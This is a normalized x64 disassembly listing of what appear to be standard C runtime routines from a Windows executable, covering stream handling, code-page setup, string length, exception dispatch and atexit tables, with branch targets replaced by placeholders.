cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_14003bdc0
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_14003be40
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_14003ed88
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_14003ed88
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_14003eec0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_14003bd5c
nop
mov rcx rbx
call sub_14003ed88
mov edi eax
mov rcx rbx
call sub_14003bdf4
mov eax edi
call sub_14003edd4
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14003ef10
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] rsp
mov r12d r8d
mov rdi rdx
mov rsi rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
xor eax eax
test rdx rdx
setne al
test eax eax
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
cmp [ rdx ] al
setne al
test eax eax
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
call sub_140043410
mov rbx rax
mov [ rsp + 0x40 ] rax
test rax rax
jne r-xdata
cmp [ rsi ] 0x0
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x18
jmp r-xdata
mov r9 rax
mov r8d r12d
mov rdx rdi
mov rcx rsi
call sub_14004f40c
mov rdi rax
mov rcx rbx
call sub_14003bdf4
mov rax rdi
call sub_14003f1a4
mov [ rax ] 0x16
lea rdx [ r-xdata ]
mov rcx [ rsp + 0x20 ]
call sub_140043790
nop
nop
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_14003eff4
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x30
mov rbx r8
mov esi edx
mov r13 rcx
mov r12 rcx
mov rdi rcx
test rcx rcx
jne r-xdata
xor eax eax
test edx edx
setns al
test eax eax
je r-xdata
test edx edx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
test rbx rbx
setne al
test eax eax
je r-xdata
add rsp 0x30
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rsp + 0x78 ] rbx
mov rcx rbx
call sub_14003bd5c
nop
test [ rbx + 0x18 ] 0x40
jne r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx rbx
call sub_14003bdf4
mov rax rdi
dec esi
mov [ rsp + 0x68 ] esi
je r-xdata
lea rcx [ rw-data ]
mov rdx rcx
lea r8 [ rw-data ]
cmp eax 0xfffffffe
je r-xdata
mov [ r12 ] 0x0
dec [ rbx + 0x8 ]
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor edi edi
mov [ rsp + 0x20 ] rdi
cmp eax 0xffffffff
je r-xdata
movsxd rdx eax
mov rcx rdx
sar rcx 0x5
lea r8 [ rw-data ]
and edx 0x1f
imul rdx rdx 0x58
add rdx [ r8 + rcx * 8 ]
lea rcx [ rw-data ]
jmp r-xdata
mov rcx rbx
call sub_140043e10
mov ecx eax
mov rax [ rbx ]
movzx ecx [ rax ]
inc rax
mov [ rbx ] rax
jmp r-xdata
test [ rcx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ rdx + 0x38 ] 0x7f
jne r-xdata
mov [ r12 ] cl
inc r12
mov [ rsp + 0x28 ] r12
cmp cl 0xa
je r-xdata
cmp r12 r13
jne r-xdata
mov [ rsp + 0x60 ] ecx
cmp ecx 0xffffffff
jne r-xdata
movsxd rcx eax
mov rax rcx
sar rax 0x5
and ecx 0x1f
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
jmp r-xdata
xor edi edi
mov [ rsp + 0x20 ] rdi
jmp r-xdata
sub_14003f15c
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_14003f1e4
push rbx
sub rsp 0x20
mov ebx ecx
call sub_140043bb0
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_14003f15c
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_140043bb0
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_14003f22c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_14003a8c0
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_14003f2c0
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
xor ebx ebx
mov rdi rcx
mov [ r11 - 0x58 ] rcx
mov [ rsp + 0x58 ] rbx
mov r13d ebx
mov r15d ebx
mov r14d ebx
mov r12d ebx
mov [ r11 - 0x50 ] rbx
cmp [ rcx + 0x14 ] ebx
je r-xdata
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
lea rbp [ rcx + 0x4 ]
lea esi [ rbx + 0x1 ]
cmp [ rbp ] ebx
jne r-xdata
lea rax [ r--data ]
mov esi 0x1
mov [ rcx + 0x130 ] rbx
mov [ rcx + 0x140 ] rax
lea rax [ r--data ]
mov [ rcx + 0x138 ] rbx
mov [ rcx + 0x148 ] rax
lea rax [ r--data ]
mov [ rcx + 0x10c ] esi
mov [ rcx + 0x150 ] rax
xor eax eax
[ rax ]
mov ecx 0x4
call sub_140041684
mov r12d 0x180
mov edx 0x2
mov ecx r12d
mov [ rsp + 0x58 ] rax
call sub_140041704
mov rdx rsi
mov ecx r12d
mov r13 rax
call sub_140041704
mov rdx rsi
mov ecx r12d
mov r15 rax
call sub_140041704
lea ecx [ r12 - 0x7f ]
mov rdx rsi
mov r14 rax
call sub_140041704
mov r12 rax
mov rax [ rsp + 0x58 ]
test rax rax
je r-xdata
movzx r8d [ rcx + 0x30 ]
lea rcx [ r11 - 0x58 ]
xor edx edx
mov r9d 0x1004
mov [ rsp + 0x20 ] rbp
call sub_14004e83c
test eax eax
jne r-xdata
mov rcx [ rsp + 0x58 ]
call sub_14003ad04
mov rcx r13
call sub_14003ad04
mov rcx r15
call sub_14003ad04
mov rcx r14
call sub_14003ad04
mov ebx esi
test r13 r13
je r-xdata
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test r12 r12
je r-xdata
test r15 r15
je r-xdata
test r14 r14
je r-xdata
mov [ rax ] ebx
mov rcx r12
mov eax ebx
mov [ rcx ] al
add eax esi
add rcx rsi
cmp eax 0x100
jl r-xdata
mov ecx [ rbp ]
lea rdx [ rsp + 0x70 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x70 ] 0x5
ja r-xdata
movzx eax [ rsp + 0x70 ]
mov [ rsp + 0x50 ] eax
cmp eax esi
jle r-xdata
mov eax [ rbp ]
mov [ rsp + 0x38 ] ebx
lea rcx [ r13 + 0x100 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rcx
xor ecx ecx
mov r9d 0x100
mov r8 r12
mov edx esi
call sub_140049690
test eax eax
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r15 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r8d [ rax + 0x1 ]
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov [ rsp + 0x20 ] eax
call sub_140041ba0
test eax eax
je r-xdata
lea rcx [ rsp + 0x77 ]
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r14 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov r8d 0x200
mov [ rsp + 0x20 ] eax
call sub_140041ba0
test eax eax
je r-xdata
movzx edx [ rcx - 0x1 ]
jmp r-xdata
lea rbp [ r13 + 0xfe ]
mov [ rbp ] bx
mov [ r15 + 0x7f ] bl
mov [ r14 + 0x7f ] bl
mov [ r15 + 0x80 ] bl
mov [ r14 + 0x80 ] bl
cmp [ rsp + 0x50 ] esi
jle r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
lea rdx [ r13 + 0x200 ]
mov r8d 0xfe
mov rcx r13
call sub_14003a8c0
lea rdx [ r15 + 0x100 ]
mov r8d 0x7f
mov rcx r15
call sub_14003a8c0
lea rdx [ r14 + 0x100 ]
mov r8d 0x7f
mov rcx r14
call sub_14003a8c0
mov rcx [ rdi + 0x130 ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
movsxd rax edx
add edx esi
mov [ rax + r12 ] 0x20
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rax ] esi
mov [ rdi + 0x130 ] rax
lea rax [ r13 + 0x100 ]
mov [ rdi + 0x140 ] rax
lea rax [ r15 + 0x80 ]
mov [ rdi + 0x138 ] rbp
mov [ rdi + 0x148 ] rax
lea rax [ r14 + 0x80 ]
mov [ rdi + 0x150 ] rax
mov eax [ rsp + 0x50 ]
mov [ rdi + 0x10c ] eax
jmp r-xdata
[ rcx ]
jne r-xdata
lea rcx [ rsp + 0x77 ]
cmp [ rcx ] bl
je r-xdata
mov rcx r12
call sub_14003ad04
mov eax ebx
jmp r-xdata
mov rcx [ rdi + 0x138 ]
sub rcx 0xfe
call sub_14003ad04
mov rcx [ rdi + 0x148 ]
add rcx 0xffffffffffffff80
call sub_14003ad04
mov rcx [ rdi + 0x150 ]
add rcx 0xffffffffffffff80
call sub_14003ad04
mov rcx [ rdi + 0x130 ]
call sub_14003ad04
movzx edx [ rcx - 0x1 ]
jmp r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
movsxd rax edx
mov r8d 0x8000
add edx esi
mov [ r13 + rax * 2 + 0x100 ] r8w
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
cmp [ rcx ] bl
je r-xdata
sub_14003f6e0
sub rsp 0x28
call sub_140043c34
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x10c ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_140045f2c
mov rcx rax
sub_14003f730
sub rsp 0x28
call sub_140043c34
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x4 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_140045f2c
mov rcx rax
sub_14003f768
sub rsp 0x28
call sub_140043c34
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
lea rax [ rcx + 0xc ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_140045f2c
mov rcx rax
sub_14003f7a0
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov ecx 0x19
call sub_140043820
mov edx 0x1
xor ecx ecx
call sub_140042c64
add rsp 0x28
jmp sub_140042c24
call rax
sub_14003f7f0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_14003f898
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_14004f750
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_14003f9ec
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_14003f898
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_14004f750
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_140040238
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_140043c34
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_14003fa98
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_140043c34
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_140043c34
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_140043c34
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_1400411d4
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_14003fb20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_140043c34
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_140043c34
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_1400411d4
call sub_140043c34
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_14003fbc4
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_140043c34
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_14003fc18
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_14004f750
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_14004e7ec
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_14003fd44
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_140043c34
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_140043c34
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_140043c34
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14003fd88
push rbx
sub rsp 0x20
mov rbx rcx
call sub_140043c34
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_14003fdbc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_140043c34
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_140043c34
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_14004e7ec
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_14004e7ec
call sub_140043c34
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_14003fe1c
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_14003a8c0
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_14004051c ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_14003ff0c
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_140041704
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_14003ff50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_14003de80
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_14004f7f4
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_14003de8c
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_140041788
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_140041788
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_140040084
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_14003a7e8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_1400400c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_14003f984
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_14003f984
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_14003f984
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_14003f99c
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_14003f984
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_14003f99c
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_14003e9f0
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_1400401e4
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_140043c34
cmp [ rax + 0x100 ] 0x0
